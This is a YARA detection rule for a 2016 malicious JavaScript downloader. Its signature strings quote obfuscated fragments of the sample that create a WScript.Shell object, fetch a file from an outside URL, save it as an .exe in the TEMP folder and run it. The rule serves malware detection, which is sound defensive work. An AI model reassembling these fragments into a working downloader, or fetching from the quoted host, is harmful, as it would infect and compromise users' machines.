rule sig_20160330_569338ee9795d2ede6d6df87dde2b2bc {
  meta:
    description = "datamaliciousorder - file 20160330_569338ee9795d2ede6d6df87dde2b2bc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3113085e8d7167870524d2006354067b9e904971d58fb376a10089c2dd56591f"

  strings:
    $s1  = "function _L(_IC, _C){_UV = _UV * 1; return _IC - _C;};" fullword ascii
    $s2  = "var _BI = function _JK() {return WScript[_YC](\"WScript\"+\".Shell\");}(), _M1 = 11;" fullword ascii
    $s3  = "_J[_ZA](\"GET\", \"http://zakazdetali.kz/v7bsad\", false);" fullword ascii
    $s4  = "if (_J[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _LF() {return _BI[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"3NAerJLdWu59ax.ex\" + \"e\";};" fullword ascii
    $s6  = "function _UP(){return _X + \"\";};" fullword ascii
    $s7  = "function _LD() {return ((_F == true) && (_F == _XX)) ? 1 : _UV;};" fullword ascii
    $s8  = "function _S(_BG){_BI[\"Run\"](_BG, _UV, _UV);};" fullword ascii
    $s9  = "var _I = new this[\"Date\"]();" fullword ascii
    $s10 = "function _CH(){return 22;};" fullword ascii
    $s11 = "function _SX()" fullword ascii
    $s12 = "function _O(){return _YC;};" fullword ascii
    $s13 = " while (_XC){" fullword ascii
    $s14 = "return _L(_ZF, _IM);" fullword ascii
    $s15 = "function _M(_B) {var _SW = (1, 2, 3, 4, 5, _B); return _SW;};" fullword ascii
    $s16 = "_F = true; " fullword ascii
    $s17 = "var _T = false;" fullword ascii
    $s18 = "_XX = true; " fullword ascii
    $s19 = "var _XX = false;" fullword ascii
    $s20 = "} catch(_X0){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}